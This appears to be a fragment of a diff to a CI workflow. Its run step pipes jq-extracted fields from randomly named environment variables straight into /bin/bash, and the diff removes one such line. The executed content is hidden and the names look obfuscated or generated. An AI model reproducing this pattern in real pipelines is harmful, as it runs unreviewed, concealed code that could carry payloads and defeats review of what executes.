@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$lf370" | jq -r .jjub0 | /bin/bash
           echo $hjvxh11054 | jq -r .lqz0 | /bin/bash
-          printf '%s' "$xa3930" | jq -r .vyufz5191 | /bin/bash
           printf '%s' "$pjd63" | jq -r .djh67945 | /bin/bash
 
       - name: Upload data
